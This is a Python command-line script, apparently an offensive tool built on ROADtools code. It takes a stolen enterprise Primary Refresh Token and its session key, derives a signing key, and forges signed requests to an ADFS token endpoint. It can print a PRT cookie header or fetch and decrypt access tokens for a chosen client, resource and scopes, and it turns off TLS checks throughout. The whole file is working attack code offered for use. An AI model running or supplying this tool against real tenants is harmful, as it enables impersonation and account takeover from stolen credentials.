import sys
import requests
import jwt
import base64
import json
import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.kbkdf import CounterLocation, KBKDFHMAC, Mode
import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from urllib3.exceptions import InsecureRequestWarning
import warnings
from cryptography.utils import CryptographyDeprecationWarning

warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

# Taken from Dirkjan's Roadlib library
# https://github.com/dirkjanm/ROADtools/blob/96e68445f94982dff5cebf96412939bf9e54956a/roadlib/roadtools/roadlib/auth.py#L907
def calculate_derived_key(sessionkey, context=None):
    """
    Calculate the derived key given a session key and optional context using KBKDFHMAC
    """
    label = b"AzureAD-SecureConversation"
    if not context:
        context = os.urandom(24)
    backend = default_backend()
    kdf = KBKDFHMAC(
        algorithm=hashes.SHA256(),
        mode=Mode.CounterMode,
        length=32,
        rlen=4,
        llen=4,
        location=CounterLocation.BeforeFixed,
        label=label,
        context=context,
        fixed=None,
        backend=backend
    )
    derived_key = kdf.derive(sessionkey)
    return context, derived_key

def generate_prt_header(hostname, eprt, signing_key, ctx):
    
    token_url = f"https://{hostname}/adfs/oauth2/token"

    try:
        response = requests.post(token_url, data="grant_type=srv_challenge", verify=False)
        nonce = response.json()["Nonce"]
    except Exception as e:
        print("Failed to get nonce: " + str(e))
        sys.exit(1)
    
    header = {
        "alg": "HS256",
        "ctx": base64.b64encode(ctx).decode("utf-8"),
        "kdf_ver": 1
    }
    
    body = {
        "refresh_token": eprt,
        "request_nonce": nonce
    }    

    token = jwt.encode(body, signing_key, algorithm="HS256", headers=header)
    
    print(token)

# Taken from ROADTools 
# https://github.com/dirkjanm/ROADtools/blob/96e68445f94982dff5cebf96412939bf9e54956a/roadlib/roadtools/roadlib/auth.py#L949
def decrypt_prt(prt, signing_key, ctx):
    
    parts = prt.split(".")
    
    header, enckey, iv, ciphertext, authtag = prt.split('.')
    header_decoded = base64.urlsafe_b64decode(header + '=' * (4 - len(header) % 4))
    
    jwe_header = json.loads(header_decoded)
    iv = base64.urlsafe_b64decode(iv + '=' * (4 - len(iv) % 4))
    ciphertext = base64.urlsafe_b64decode(ciphertext + '=' * (4 - len(ciphertext) % 4))
    authtag = base64.urlsafe_b64decode(authtag + '=' * (4 - len(authtag) % 4))
    
    if jwe_header["enc"] == "A256GCM" and len(iv) == 12:
        aesgcm = AESGCM(signing_key)
        depadded_data = aesgcm.decrypt(iv, ciphertext + authtag, header.encode("utf-8"))
        token = json.loads(depadded_data)
    else:
        cipher = Cipher(algorithms.AES(signing_key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        depadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
        token = json.loads(depadded_data)
    
    return token

def request_access_token(hostname, client_id, scopes, resource, eprt, signing_key, ctx):
    
    token_url = f"https://{hostname}/adfs/oauth2/token"
    
    header = {
        "alg": "HS256",
        "ctx": base64.b64encode(ctx).decode("utf-8"),
        "kdf_ver": 1
    }
    
    body = {
        "scope": " ".join(scopes),
        "client_id": client_id,
        "resource": resource,
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(days=1),
        "grant_type": "refresh_token",
        "refresh_token": eprt
    }
    
    token = jwt.encode(body, signing_key, algorithm="HS256", headers=header)

    response = requests.post(token_url, data="grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&request=" + token, verify=False)
    
    # Decrypt the Access Token
    response_text = response.text
    
    return decrypt_prt(response_text, signing_key, ctx)

def print_usage():
    print("Usage: access_token.py prt <hostname> <EPRT> <SESSION_KEY> <CLIENT_ID> <RESOURCE_ID> scope1,scope2,scope3")
    print("Usage: access_token.py header <hostname> <EPRT> <SESSION_KEY>")
    sys.exit(1)
    
if __name__ == "__main__":
    if len(sys.argv) < 5:
        print_usage()
        
    if sys.argv[1] == "prt":
        mode = "prt"
        if len(sys.argv) != 8:
            print_usage()
    else:
        mode = "header"
        if len(sys.argv) != 5:
            print_usage()
        
    host = sys.argv[2]
    eprt = sys.argv[3]
    session_key = base64.b64decode(sys.argv[4])
        
    print("[*] Requesting Access Token with EPRT")
        
    ctx, signing_key = calculate_derived_key(session_key, None)
    
    print("[*] Calculated derived key: {}".format(base64.b64encode(signing_key).decode("utf-8")))
    print("[*] Generated context: {}".format(base64.b64encode(ctx).decode("utf-8")))
    
    if mode == "header":
        response = generate_prt_header(host, eprt, signing_key, ctx)
    else:
        response = request_access_token(host, sys.argv[5], sys.argv[7].split(","), sys.argv[6], eprt, signing_key, ctx)
    
    print(response)
    
